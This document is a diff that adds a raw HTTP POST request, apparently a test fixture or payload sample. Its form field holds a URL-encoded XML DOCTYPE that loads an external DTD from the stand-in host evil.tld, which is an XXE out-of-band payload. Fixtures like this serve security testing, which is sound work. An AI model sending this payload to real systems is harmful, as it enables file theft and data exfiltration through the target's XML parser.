@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 56
+Connection: close
+
+url=<!DOCTYPE%0ar%0aSYSTEM%0a"http://evil.tld/evil.dtd">
